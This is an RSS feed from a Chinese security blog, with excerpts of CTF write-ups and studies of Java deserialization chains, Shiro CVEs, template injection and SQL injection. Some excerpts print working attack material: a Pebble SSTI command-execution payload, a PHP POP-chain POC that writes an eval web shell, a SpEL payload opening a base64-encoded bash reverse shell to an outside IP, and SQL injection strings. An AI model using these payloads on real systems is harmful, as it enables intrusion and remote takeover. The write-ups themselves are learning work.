<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web on BRIdGE</title>
    <link>https://kingbridgess.github.io/tags/web/</link>
    <description>Recent content in Web on BRIdGE</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 31 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://kingbridgess.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>觑觎 JDK7u21、8u20 反序列化链</title>
      <link>https://kingbridgess.github.io/posts/jdk7u21-8u20/</link>
      <pubDate>Mon, 31 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/jdk7u21-8u20/</guid>
      <description>前言 2015年Frohoff不仅给出了CommonsCollections的反序列化链，更给出了无第三方依赖的Jdk7u21链。同年Wouter Coekaerts提出了较高版本Jdk8u20的绕过思路。今天我站在巨人的肩膀上试图觑觎这两条鄙人目前认为最复杂的两条链。
JDK7u21 HashMap 在分析前，先学习一个非常重要的数据结构&amp;ndash;哈希表。关于这方面的文章网上很多。
一篇文章教你读懂哈希表-HashMap
在Java中已经封装好了这样一个类 &amp;ndash; HashMap
HashMap源码分析（jdk1.8，保证你能看懂） - 知乎专栏
在Java HashMap中，哈希表对应的“桶”就是属性table
Jdk1.7
// The table, resized as necessary. Length MUST Always be a power of two. transient Entry&amp;lt;K,V&amp;gt;[] table = (Entry&amp;lt;K,V&amp;gt;[]) EMPTY_TABLE; Jdk1.8 改成了Node，有可能建立一个红黑树。
/** * The table, initialized on first use, and resized as * necessary. When allocated, length is always a power of two. * (We also tolerate length zero in some operations to allow * bootstrapping mechanics that are currently not needed.</description>
    </item>
    
    <item>
      <title>Apache Shiro 部分历史漏洞复现</title>
      <link>https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sat, 22 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/apache-shiro-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>太长不看 着手开始复现shiro历史漏洞其实是为了每周一次的web研讨，结果开始写的时候CVE-2022-40664刚刚爆出来，就正好混了一次展示。
本文基本参考素十八师傅的专题 从 CVE 学 Shiro 安全的思路，加之我对其的一些粗浅理解。
我选择了一些shiro种比较有代表性的漏洞：如CVE-2021-3863可以看作是路径处理过程中产生问题导致的绕过的代表，而CVE-2016-4437则是大名鼎鼎的shiro反序列化。其他的历史漏洞大可以拜读素十八师傅的专题文章，这里就不再复现。
shiro 简介 见 https://www.infoq.com/articles/apache-shiro/
主要需要了解 Subject, SecurityManager, and Realms 这三个概念
Servlet Filter See https://tomcat.apache.org/tomcat-5.5-doc/servletapi/index.html
public interface Filter A filter is an object that performs filtering tasks on either the request to a resource (a servlet or static content), or on the response from a resource, or both.
Filters perform filtering in the doFilter method. Every Filter has access to a FilterConfig object from which it can obtain its initialization parameters, a reference to the ServletContext which it can use, for example, to load resources needed for filtering tasks.</description>
    </item>
    
    <item>
      <title>TSCTF-J 2022 词超人 &amp; 你的名字 &amp; ezja official(?) write up</title>
      <link>https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/</link>
      <pubDate>Thu, 20 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/tsctf-j-2022-%E8%AF%8D%E8%B6%85%E4%BA%BA%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97ezja-write-up/</guid>
      <description>词超人 帮助大家美美过四六级（bushi
一共1000个单词，填对所有单词返回flag
预期解: 手填1000个单词 人间正道是沧桑 非预期解 好了好了，说正事（
本题灵感来源于针对刷课/刷题网站的脚本。
一些不好好学英语的坏孩子提供了一些歪点子：
浏览器控制台执行js脚本填入所有单词 写python爬虫脚本发包 字符串处理 可以抓包看看前端发过去了什么东西
是一个id和answer组成的json数组。而仔细观察前端html源码会发现，每一个单词的id和answer都给了
思路1 观察submit函数的这一部分
const answerArray=[]; let divArray=document.getElementsByClassName(&amp;#39;chunk&amp;#39;) for(div of divArray){ answerArray.push({id:div.id,answer:div.getElementsByTagName(&amp;#39;input&amp;#39;)[0].value}) } answerArray就是最终发的数据。我们可以改其push的answer字段，让它是需要提交的英文答案。
answerArray.push({id:div.id,answer:div.getElementsByClassName(&#39;en&#39;) [0].innerHTML})
这里可能涉及到了利用javascript对dom元素操作的知识。不熟悉的同学可以看看w3的文档
https://www.w3schools.com/js/js_htmldom_elements.asp
然后把修改后的submit函数复制到浏览器控制台里
点击提交
另外，也可以直接在控制台写脚本把所有词都填上
getby方法
const divArray=document.getElementsByClassName(&amp;#39;chunk&amp;#39;) for(div of divArray){ const en=div.getElementsByClassName(&amp;#39;en&amp;#39;)[0].innerHTML div.getElementsByTagName(&amp;#39;input&amp;#39;)[0].value=en } 或者用querySeletor一行搞定
[...document.querySelectorAll(&amp;#34;.chunk&amp;#34;)].forEach( (c) =&amp;gt; (c.querySelector(&amp;#34;input&amp;#34;).value = c.querySelector(&amp;#34;.en&amp;#34;).innerHTML.trim()) ); 思路2 熟悉正则表达式的同学大可以写一个python爬虫，构造出所有答案正确的json后提交
import requests import re url=&amp;#39;http://49.232.201.163:46128&amp;#39; text=requests.get(url).text idArray=re.findall(r&amp;#39;&amp;lt;div id=&amp;#34;(.+)&amp;#34; class=&amp;#34;chunk&amp;#34; style=&amp;#34; width: 30%;margin: 25px auto;text-align: left;&amp;#34;&amp;gt;&amp;#39;,text) enArray=re.findall(r&amp;#39;&amp;lt;p class=&amp;#34;en&amp;#34; style=&amp;#34;visibility:hidden;display: inline&amp;#34;&amp;gt;(.</description>
    </item>
    
    <item>
      <title>0ctf Tctf 2022 Hessian Only Jdk 复现和学习</title>
      <link>https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Wed, 21 Sep 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/0ctf-tctf-2022-hessian-only-jdk-%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</guid>
      <description>麻了，一个比赛就看了一道题还做不动555
题目的环境和 write up
https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk
简单分析 路由简单粗暴的反序列化点
package com.ctf.hessian.onlyJdk; import com.caucho.hessian.io.Hessian2Input; import com.sun.net.httpserver.HttpExchange; import com.sun.net.httpserver.HttpHandler; import com.sun.net.httpserver.HttpServer; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.InetSocketAddress; import java.util.concurrent.Executors; public class Index { public static void main(String[] args) throws Exception { System.out.println(&amp;#34;server start&amp;#34;); HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0); server.createContext(&amp;#34;/&amp;#34;, new MyHandler()); server.setExecutor(Executors.newCachedThreadPool()); server.start(); } static class MyHandler implements HttpHandler { public void handle(HttpExchange t) throws IOException { String response = &amp;#34;Welcome to 0CTF 2022!</description>
    </item>
    
    <item>
      <title>Pebble最新模板注入 新gadgets</title>
      <link>https://kingbridgess.github.io/posts/pebble%E6%9C%80%E6%96%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%96%B0gadgets/</link>
      <pubDate>Tue, 16 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/pebble%E6%9C%80%E6%96%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%96%B0gadgets/</guid>
      <description>Y4tacker师傅在这篇文章中给出了Pebble最新模板注入的exp
2022UIUCTF-Spoink(Pebble最新模板注入)
其中，在用internalCachingMetadataReaderFactory加载类后，使用了jacksonObjectMapper调用受限制的无参构造器。
Y4tacker师傅随后用Beans绕过了jackson的黑名单，实例化了ClassPathXmlApplicationContext
但其实既然可以实例化无参构造器，这里野路子还是很多的。在SilentE大爹的帮助下，我找到了另一个类
org.springframework.expression.spel.standard.SpelExpressionParser
这个类满足上述条件，且不受jackson限制，也不用出网，而且是SpringBoot自带的。原理如下
String cmdStr = &amp;#34;new java.lang.ProcessBuilder(new String[]{\&amp;#34;calc\&amp;#34;}).start()&amp;#34;; SpelExpressionParser parser = new SpelExpressionParser(); parser.parseExpression(cmdStr).getValue(); payload {% set clazz=beans.get(&amp;#34;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&amp;#34;).getResourceLoader().getClassLoader().loadClass(&amp;#34;org.springframework.expression.spel.standard.SpelExpressionParser&amp;#34;) %} {% set instance = beans.get(&amp;#34;jacksonObjectMapper&amp;#34;).readValue(&amp;#34;{}&amp;#34;, clazz) %} {{instance.parseExpression(&amp;#34;new java.lang.ProcessBuilder(\&amp;#34;calc\&amp;#34;).start()&amp;#34;).getValue()}} </description>
    </item>
    
    <item>
      <title>Mako Framework 反序列化链(POP Chain)挖掘</title>
      <link>https://kingbridgess.github.io/posts/mako-framework-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpop-chain%E6%8C%96%E6%8E%98/</link>
      <pubDate>Mon, 01 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/mako-framework-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpop-chain%E6%8C%96%E6%8E%98/</guid>
      <description>Mako Framework官网
https://makoframework.com/
如果有可控的数据直接unserialze()，这条链可以做到任意文件写。web目录爆出来的话可以写马RCE。
POC 注意绕一下File.php里对参数的处理
&amp;lt;?php namespace mako\file{ class FileSystem{} } namespace mako\session\stores{ class File { protected $sessionPath=&amp;#34;D:/phpstudy_pro/WWW/cake/public&amp;#34;; protected $fileSystem; public function __construct(){ $this-&amp;gt;fileSystem=new \mako\file\FileSystem(); } } } namespace mako\session{ class Session{ protected $autoCommit=true; protected $flashData=&amp;#34;&amp;lt;?php eval(\$_POST[1]);//&amp;#34;; protected $sessionData = []; protected $destroyed = false; protected $store; protected $sessionId=&amp;#34;shell.php&amp;#34;; public function __construct(){ $this-&amp;gt;store=new \mako\session\stores\File(); } } } namespace { echo base64_encode(serialize(new \mako\session\Session())); } ?&amp;gt; </description>
    </item>
    
    <item>
      <title>近期java赛题复现</title>
      <link>https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/%E8%BF%91%E6%9C%9Fjava%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</guid>
      <description>Mini-L-CTF-2022 minispringboot Spring View Manipulation注入，也是基于Thymeleaf的ssti。当时get参数是个?name=xxx，强烈怀疑是注入点，但是没反应。结果路由也是可以注的
可参考 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#java 里的 Thymeleaf
这里涉及到SpringEL，这个是用来方便Bean依赖注入的东西。先学一下SpringEL基本语法
https://blog.csdn.net/wb1046329430/article/details/121563724
值得注意的是，T(xxx)可以引入xxx这个包
本地可以起一个spring测试一下SpringEL Expression
main里写一个类
package com.example.spel; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.springframework.stereotype.Component; @Component public class SpringEl { @Value(&amp;#34;#{T(java.lang.Runtime).getRuntime().exec(\&amp;#34;calc\&amp;#34;)}&amp;#34;) public Object v; } test里写一个测试类
package com.example.spel; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class Test1 { @Autowired private SpringEl springEl; @Test void test(){ System.out.println(springEl.v); } } 题目过滤了new和runtime，第一种方法（官方的预期）用process builder绕过(下面的payload最后都需要urlencode，为了方便看先不编码)：
另外测试会发现new可以换成New，也可以执行的
http://192.168.238.165:49153/__${New ProcessBuilder(&amp;quot;curl xxx.dnslog.cn&amp;quot;).start()}__::.x
然后想要弹shell的话，ProcessBuilder里面的命令也是有点学问的，可以参考
https://www.jianshu.com/p/eb41a0291123
https://www.jianshu.com/p/ae3922db1f70
按文章的思路，加上本地测试一下构造这个Payload即可弹shell
有一点，payload中有&amp;rsquo;/&amp;lsquo;就会报400错误，要避免这个。
http://192.168.238.165:49153/__${New ProcessBuilder(&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&amp;quot;).start()}__::.x
另外，这题是有很多其他思路的。以下参考了Flowey大佬们的wp</description>
    </item>
    
    <item>
      <title>Hgame2022 Web</title>
      <link>https://kingbridgess.github.io/posts/hgame2022-web/</link>
      <pubDate>Sat, 19 Feb 2022 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/hgame2022-web/</guid>
      <description>week1 ez_auth 随便注册个账号，丢到https://jwt.io/解密,secret是空的，改成admin，得到token
GET /v1/todo/list HTTP/1.1 Host: whatadminisdoingwhat.mjclouds.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://adminisdoingwhat.mjclouds.com/ token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MCwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDI3MzI5NjgsImlzcyI6Ik1KY2xvdWRzIn0.YYX2DeTpeRJpJqM9Vbr3DIMrV0MAOaNk53VzqtPicLA Origin: http://adminisdoingwhat.mjclouds.com Connection: close 蛛蛛&amp;hellip;嘿嘿♥我的蛛蛛 爬虫爬到100页，flag在headers里
import requests import re def go(): url=&amp;#34;https://hgame-spider.vidar.club/5b572441ee?key=yvHWAgnLk0DNnQDiUOYAzWXsnODq7mELHvYDgRFKpEkC%2FsDVkoVIYtg90%2F7PlRw4TdvToBS7Yq4hVcRWr%2Fch7g%3D%3D&amp;#34; while(1): res=requests.get(url=url) print(res.text) key=getKey(res.text) url=&amp;#34;https://hgame-spider.vidar.club/5b572441ee?&amp;#34;+key def getKey(text): pattern = re.compile(&amp;#39;href=&amp;#34;\?(.*?)&amp;#34;&amp;#39;) key = str(re.search(pattern=pattern, string=text).groups()[0]) return key if __name__==&amp;#34;__main__&amp;#34;: go() Tetris plus 访问view-source:https://game.summ3r.top/Tetris/js/checking.js看到jsfuck，丢到控制台得到flag
Fujiwara Tofu Shop 一串抽象headers&amp;hellip;.
GET / HTTP/1.</description>
    </item>
    
    <item>
      <title>RedTiger&#39;s Hackit Write Up</title>
      <link>https://kingbridgess.github.io/posts/redtigers-hackit/</link>
      <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://kingbridgess.github.io/posts/redtigers-hackit/</guid>
      <description>网址：https://redtiger.labs.overthewire.org/
level1 对着登陆框跑字典直接没有用，遂无思路。跑去看答案，发现点击category会直接传参&amp;hellip;
https://redtiger.labs.overthewire.org/level1.php?cat=1
把get方法?cat=1改成?cat=2-1，正常回显，所以是不带引号的数字型注入。输入以下payload: cat=-1 union select group_concat(column_name) from information_schema.columns where table_name=level1_users
直接回显&amp;quot;some things is disable&amp;quot;于是又卡住。直接看答案，发现我简直在乱搞。正确思路是：
1.cat=1 order by i #通过增大i的值判断当前表有几列。事实上有4列，i&amp;gt;4无法正常回显。
2.cat=-1 union select 1,2,3,4 #判断前端显示的是哪几列。本题中显示3，4
3.由于给了表名，结合盲猜字段，输入cat=-1 union select 1,2,Username,Password from level1_users #得到答案。
level2 提示condition,账号密码都填&#39; or 1=1 #就能过
level3 目标：得到Admin密码
点show userdetails，发现get了一个这个东西：usr=MDQyMjExMDE0MTgyMTQw
然后显示了这个表
显然我们要改usr来查表。但是usr加密了，直接不会。提示说利用报错，但我半天没搞出来报错。瞅了下答案，发现这信息检索绝了：
get一个数组就能引起报错。访问https://redtiger.labs.overthewire.org/level3.php?usr[]
报错
Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 26
然后直接访问
https://redtiger.labs.overthewire.org/urlcrypt.inc
control+U看源码，发现加密和解密源码
&amp;lt;?php // warning! ugly code ahead :) // requires php5.</description>
    </item>
    
  </channel>
</rss>
